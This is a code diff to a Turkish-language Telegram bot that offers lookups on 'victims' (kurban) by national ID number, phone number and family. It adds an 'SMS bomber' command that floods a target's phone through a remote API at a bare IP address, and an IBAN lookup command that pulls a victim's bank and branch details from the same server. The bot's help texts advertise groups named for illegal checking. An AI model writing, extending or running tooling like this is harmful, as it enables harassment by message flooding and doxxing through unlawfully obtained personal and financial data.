@@ -63,6 +63,10 @@ def commands(call):
         telebot.types.InlineKeyboardButton("TC Plus", callback_data="tc_plus")
     )
     markup.add(
+        telebot.types.InlineKeyboardButton("Sms Bomber", callback_data="sms_bomber"),
+        telebot.types.InlineKeyboardButton("Iban Sorgu", callback_data="iban_sorgu")
+    )
+    markup.add(
         telebot.types.InlineKeyboardButton("Ek Komutlar", callback_data="extra"),
         telebot.types.InlineKeyboardButton("⬅️ Geri", callback_data="back")
     )
@@ -73,7 +77,7 @@ def commands(call):
 def back(call):
     start(call.message)
 
-@bot.callback_query_handler(func=lambda call: call.data in ["name", "tc", "gsm_tc", "tc_gsm", "aile", "tc_plus", "extra"])
+@bot.callback_query_handler(func=lambda call: call.data in ["name", "tc", "gsm_tc", "tc_gsm", "aile", "tc_plus", "extra", "sms_bomber", "iban_sorgu"])
 def other_commands(call):
     if call.data == "name":
         response = "Ad Soyad Sorgu Yardım:\n\n/sorgu -isim <kurbanın adı> -soyisim <kurbanın soy adı> -il <kurbanın il>\n\nİki isimli Sorgulama için -isim2 kullanabilirsiniz örnek:\n/sorgu -isim betül -isim2 berra -soyisim kapancı -il istanbul"
@@ -87,6 +91,10 @@ def other_commands(call):
         response = "Aile Sorgu Yardım:\n\n/aile <kurbanın tc>\n\nHer Gün Çok Güzel Paylaşımlar Olan Kanalımıza Katıl. @illegalchecker"
     elif call.data == "tc_plus":
         response = "TC Plus Sorgu Yardım:\n\n/tcplus <kurbanın tc>\n\nSohbet Grubumuza Katılmaya Ne Dersin?"
+    elif call.data == "iban_sorgu":
+        response = "İban Sorgu Yardım:\n\n/iban <kurbanın iban>\n\nkurbanın ibanı birleşik girin örnek TR317377373722"
+    elif call.data == "sms_bomber":
+        response = "Sms Bomber Yardım:\n\n/sms <kurbanın gsm>\n\nSohbet Grubumuza Katılmaya Ne Dersin? @Majestesohbet"
     elif call.data == "extra":
         response = "Ekstra Komutlar:\n\n/yaz - Verdiğiniz Metni Deftere Yazar.\n\n/tekrarla Verdiğiniz Metni Tekrarlar\n\n@illegalchecker ve @Majestesohbet Katılmayı Unutma"
 
@@ -565,6 +573,79 @@ def tekrarla(message):
     else:
         
         bot.reply_to(message, metin)
+
+@bot.message_handler(commands=['iban'])
+def iban_sorgula(message):
+    chat_id = message.chat.id
+    user_input = message.text.split(' ', 1)
+
+    if len(user_input) != 2:
+        bot.send_message(chat_id, "Lütfen geçerli bir IBAN girin.")
+        return
+
+    iban = user_input[1]
+    api_url = f'http://213.238.177.177/o7apiservis/iban.php?&iban={iban}'
+
+    response = requests.get(api_url)
+
+    if response.status_code == 200:
+        data = response.json()
+        if 'BANKA' in data and 'ŞUBE' in data:
+            banka = data['BANKA']
+            sube = data['ŞUBE']
+
+            response_message = (
+                "╭━━━━━━━━━━━━━╮\n"
+                "┃➥ Banka Bilgileri\n"
+                f"┃➥ ADI: {banka['Adı']}\n"
+                f"┃➥ KOD: {banka['Kod']}\n"
+                f"┃➥ SWİFT: {banka['Swift']}\n"
+                f"┃➥ HESAP NO: {banka['Hesap No']}\n"
+                "╰━━━━━━━━━━━━━╯\n\n"
+                "╭━━━━━━━━━━━━━╮\n"
+                "┃➥ Şube Bilgileri\n"
+                f"┃➥ ADI: {sube['Ad']}\n"
+                f"┃➥ KOD: {sube['Kod']}\n"
+                f"┃➥ İL: {sube['İl']}\n"
+                f"┃➥ İLÇE: {sube['İlçe']}\n"
+                f"┃➥ TEL: {sube['Tel']}\n"
+                f"┃➥ FAX: {sube['Fax']}\n"
+                f"┃➥ ADRES: {sube['Adres']}\n"
+                "╰━━━━━━━━━━━━━╯"
+            )
+
+            bot.send_message(chat_id, response_message)
+        else:
+            bot.send_message(chat_id, "╭─────📛─────╮\n│ 𝖲𝗈𝗇𝗎𝖼̧ 𝖡𝗎𝗅𝗎𝗇𝗆𝖺𝖽ı\n╰────────────╯")
+    else:
+        bot.send_message(chat_id, "uykum var sg")
+
+@bot.message_handler(commands=['sms'])
+def send_sms(message):
+    chat_id = message.chat.id
+    user_input = message.text.split(' ', 1)
+
+    if len(user_input) != 2:
+        bot.send_message(chat_id, "Lütfen geçerli bir telefon numarası girin. örnek:\n\n/sms 5553723339")
+        return
+
+    gsm_number = user_input[1]
+    api_url = f'http://213.238.177.177/o7apiservis/sms.php?&telno={gsm_number}'
+
+    
+    start_message = bot.send_message(chat_id, "Smsler Gönderiliyor...")
+
+    
+    response = requests.get(api_url)
+
+    if response.status_code == 200:
+        
+        bot.send_message(chat_id, "Smsler Başarılı Bir Şekilde Gönderildi!\n\nSistem Projessor </>")
+    else:
+        bot.send_message(chat_id, "SMS gönderirken bir hata oluştu.")
+
+    
+    bot.delete_message(chat_id, start_message.message_id)
 
 while True:
     try:
